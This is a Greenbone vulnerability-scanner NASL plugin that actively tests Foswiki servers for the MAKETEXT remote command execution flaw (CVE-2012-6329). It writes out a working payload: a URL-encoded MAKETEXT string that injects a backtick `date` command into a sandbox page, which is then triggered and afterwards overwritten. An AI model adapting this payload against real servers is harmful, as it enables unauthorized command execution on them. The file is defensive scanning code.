# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:foswiki:foswiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802049");
  script_version("2024-06-28T05:05:33+0000");
  script_cve_id("CVE-2012-6329", "CVE-2012-6330");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"last_modification", value:"2024-06-28 05:05:33 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2013-01-02 15:49:29 +0530 (Wed, 02 Jan 2013)");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Foswiki 'MAKETEXT' variable RCE Vulnerability");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("gb_foswiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Foswiki/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51516");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56950");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80689");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/23580");
  script_xref(name:"URL", value:"http://foswiki.org/Support/SecurityAlert-CVE-2012-6329");
  script_xref(name:"URL", value:"http://foswiki.org/Support/SecurityAlert-CVE-2012-6330");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to execute shell commands by
  Perl backtick (``) operators.");

  script_tag(name:"affected", value:"Foswiki version 1.0.0 through 1.0.10 and 1.1.0 through 1.1.6");

  script_tag(name:"insight", value:"flaw is due to improper validation of '%MAKETEXT{}%' foswiki macro
  (UserInterfaceInternationalisation is enabled) which is used to localize user interface content to a language of choice.");

  script_tag(name:"solution", value:"Upgrade to Foswiki version 1.1.7 or later or apply the patch
  from the referenced vendor advisories.");

  script_tag(name:"summary", value:"foswiki is prone to a remote command execution (RCE) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Function to get cookie and construct validation key
function get_cookie_validation_keys(res)
{
  if(res !~ "^HTTP/1\.[01] 200" || "name='validation_key' value=" >!< res){
    exit(0);
  }

  ## Extract validation_key and Exit if not present
  validation_key = eregmatch(pattern:"name='validation_key' value='\?([0-9a-f]*)'",
                             string:res);
  if(!validation_key[1]){
    return NULL;
  }
  validation_key = validation_key[1];

  ## Extract cookie
  cookie = eregmatch(pattern:"Set-Cookie: FOSWIKISID=([0-9a-f]*);", string:res);
  if(!cookie[1]){
    return NULL;
  }
  cookie = cookie[1];

  ## Extract cookie
  fs_strike_one = eregmatch(pattern:"Set-Cookie: FOSWIKISTRIKEONE=([0-9a-f]*);",
                            string:res);
  if(!fs_strike_one[1]){
    return NULL;
  }
  fs_strike_one = fs_strike_one[1];

  validation_key = hexstr(MD5(validation_key + fs_strike_one));

  cookie_validation_key_info = make_list(cookie, validation_key);

  return(cookie_validation_key_info);
}

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

useragent = http_get_user_agent();
host = http_host_name( port:port );

sandbox_page = "/Sandbox/OVTestPage123";

url1 = dir + "/bin/edit" + sandbox_page + "?nowysiwyg=1";
req1 = string("GET ", url1 , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: FOSWIKISID=\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 0\r\n\r\n");
res1 = http_keepalive_send_recv(port:port, data:req1);

cookie_validation_key_info = get_cookie_validation_keys(res:res1);
if(!cookie_validation_key_info[0] || !cookie_validation_key_info[1]){
  exit(0);
}
cookie = cookie_validation_key_info[0];
validation_key = cookie_validation_key_info[1];

## Insert RCE and save the page
url2 = dir + "/bin/save" + sandbox_page;
req2 = string("POST ", url2 , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n");

post_data1 = string("validation%5fkey=", validation_key , "&text=VTTest%20%25",
            "MAKETEXT%7B%22APt%20%5B_1%5D%20rxCsi%5C%5C'%7D%3B%20%60date",
            "%60%3B%20%7B%20%23%22%20args%3D%22QpR%22%7D%25");

req3 = string(req2, "Cookie: FOSWIKISID=", cookie, "\r\n",
             "Content-Length: ", strlen(post_data1), "\r\n\r\n", post_data1);
res3 = http_keepalive_send_recv(port:port, data:req3);

## Execute RCE by accessing the page
url4 = dir + sandbox_page;
req4 = string("GET ", url4 , " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: FOSWIKISID=", "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 0\r\n\r\n");
res4 = http_keepalive_send_recv(port:port, data:req4);

if(res4 =~ "^HTTP/1\.[01] 200" && "}; `date`; {" >!< res4 &&
   ">VTTest<" >< res4 && "HASH(0x" >< res4){
  security_message(port:port);
}

## RCE Cleanup
res5 = http_keepalive_send_recv(port:port, data:req1);

cookie_validation_key_info = get_cookie_validation_keys(res:res5);
if(!cookie_validation_key_info[0] || !cookie_validation_key_info[1]){
  exit(0);
}
cookie = cookie_validation_key_info[0];
validation_key = cookie_validation_key_info[1];

## Insert sample string OV-Test into the page by removing malicious request
post_data2 = string("validation%5fkey=", validation_key , "&text=OV-Test");
req6 = string(req2, "Cookie: FOSWIKISID=", cookie, "\r\n",
              "Content-Length: ", strlen(post_data2), "\r\n\r\n", post_data2);
http_keepalive_send_recv(port:port, data:req6);
